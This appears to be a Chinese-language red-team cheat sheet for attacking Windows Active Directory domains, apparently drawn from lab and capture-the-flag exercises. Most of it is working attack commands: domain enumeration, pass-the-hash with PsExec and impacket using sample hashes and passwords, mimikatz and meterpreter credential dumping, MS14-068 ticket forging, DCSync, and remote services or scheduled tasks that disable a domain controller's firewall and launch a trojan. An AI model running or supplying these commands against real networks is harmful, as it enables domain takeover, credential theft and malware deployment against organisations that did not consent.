[干货 | 域内敏感信息搜集](https://mp.weixin.qq.com/s/nFOAb__c162gMhve3MEh_Q)

## 信息收集

```shell
net time /domain # 判断当前主机是否在域内
net user /domain
获取域内用户的详细信息：
wmic useraccount get /all

net group "domain controllers" /domain # 查看域控 OWA$
ping OWA # 域控主机即可获得域控IP
# 查看所有域成员计算机列表
net group "domain computers" /domain
# 查看域管理员, 看到管理员后 meterpreter > ps , migrate xxx 偷令牌
Net group "domain admins" /domain
# 登陆本机的域管理员
net localgroup administrators /domain
# 查看域成员 假设域为god
net view /domain:god
# 当前计算机名
hostname
# 查看域控列表
beacon> net dclist

# 三种情况
##1. 存在域，但当前用户不是域用户，提示说明权限不够
##2. 存在域，并且当前用户是域用户
##3. 当前网络环境为工作组，不存在域
```


## 攻击 

```shell
# PSTools 使用哈希传递(PTH)攻击 https://mp.weixin.qq.com/s/6BYAeo-5I1XMejyC5ec1pw
PsExec.exe \\192.168.52.138 -u god\administrator -p hongrisec@2022 -s cmd #成功，拿下域控了。
# impact: pip install impacket, win下pyexec用对应的py文件 python psexec.py xxxxxxx
psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.138 #成功，拿下域控了。
psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.141 #成功，拿下域控了。
# impact: 连接cmd
proxychains python3 wmiexec.py 'administrator:123qwe!ASD@192.168.93.20'
# smbclient 上传文件
proxychains smbclient //192.168.93.20/c$ -U administrator%password
smb > put mimikatz.exe # 上传文件

# msf meterpreter
meterpreter > getsystem
meterpreter > getuid
meterpreter > ps     # 非system时, 查看system权限进程，迁移
meterpreter > migrate 216
meterpreter > load kiwi  # 读取密码, 如果是64位的迁移到64位进程才能看明文
meterpreter > getsystem
meterpreter > creds_kerberos

# mimikatz
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > log.log


win7共享给域控
copy c:\phpstudy\srn7final.exe \\192.168.52.138\c$
设置计划任务启动木马
schtasks /create /tn "test123456" /tr C:\srn7final.exe /sc once /st 14.25 /S 192.168.52.138 /RU System /u administrator /p "hongrisec@2021"
```
### ms14-068生成票据, 注入票据
[L1](https://mp.weixin.qq.com/s/tTuH3_YY_C0AuPSLfo8mTQ) [L2](https://www.freebuf.com/articles/web/340783.html)


整理信息

```ts
USER：douser
Domain：DEMO.COM
NTLM：bc23b0b4d5bf5ff42bc61fb62e13886e
SID：S-1-5-21-979886063-1111900045-1414766810-1107
PASSWORD：Dotest123
```
上传MS14-068

```shell
MS14-068.exe -u douser@DEMO.COM -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130
dir 
```

通过 mimikatz 导入TGT票据将写入，从而提升为域管理员
```bat
kerberos::purge
kerberos::ptc TGT_douser@DEMO.COM.ccache
exit

dir \\WIN-ENS2VR5TR3N\c$


:: 通过文件共享将马复制到域控中
:: 运行方式2 sc , 关闭域控防火墙 上马
:: cmd 下切换高级用户权限
net use \\192.168.138.138\ipc$ "dc123.com" /user:"administrator"
sc \\WIN-ENS2VR5TR3N create ProFirewall binpath= "netsh advfirewall set allprofiles state off"
sc \\WIN-ENS2VR5TR3N start ProFirewall
sc \\WIN-ENS2VR5TR3N create Startup binpath= "C:\shell.exe"
sc \\WIN-ENS2VR5TR3N start Startup

:: 运行方式1 schtasks
(
echo netsh advfirewall set allprofiles state off
echo shell.exe
) >1.bat
copy 1.bat \\WIN-ENS2VR5TR3N\c$ /y
copy shell.exe \\WIN-ENS2VR5TR3N\c$ /y
:: 运行方式2 schtasks
schtasks /create /S WIN-ENS2VR5TR3N /TN "test" /TR c:/1.bat /SC MINUTE /ST 21:27 /ru system /f

:: 下一步 psexec
```

### shadow-credentials
[Link](https://zhuanlan.zhihu.com/p/581451146)

条件: 以下账户拥有 msDS-KeyCredentialLink 属性的写入权限：

* 域管理员账户
* Key Admins 组中的账户
* Enterprise Key Admins 组中的账户
* 对 Active Directory 中的对象具有 GenericAll 或 GenericWrite 权限的帐户
* 机器账户对自身的 msDS-KeyCredentialLink 属性拥有写入权限

### Dsync攻击 
[Dsync](http://www.malabis.site/2022/11/12/春秋云镜-Initial/#横向移动)

DCSync攻击前提 一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：

* Administrators组内的用户
* Domain Admins组内的用户
* Enterprise Admins组内的用户
* 域控制器的计算机帐户
* 即：默认情况下域管理员组具有该权限。
```sh
meterpreter > load kiwi
meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
# 拿到hash后 通过哈希传递 拿到域控
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"

```
### DC Takeover
[Ichunqiu云境 —— Tsclient Writeup](https://mp.weixin.qq.com/s/1VDwjl_fhpZOKUy5-ZHCTQ)

# Article

[域内定位个人PC的三种方式](https://mp.weixin.qq.com/s/uXTo2AbmvMeNesR8rAjImw)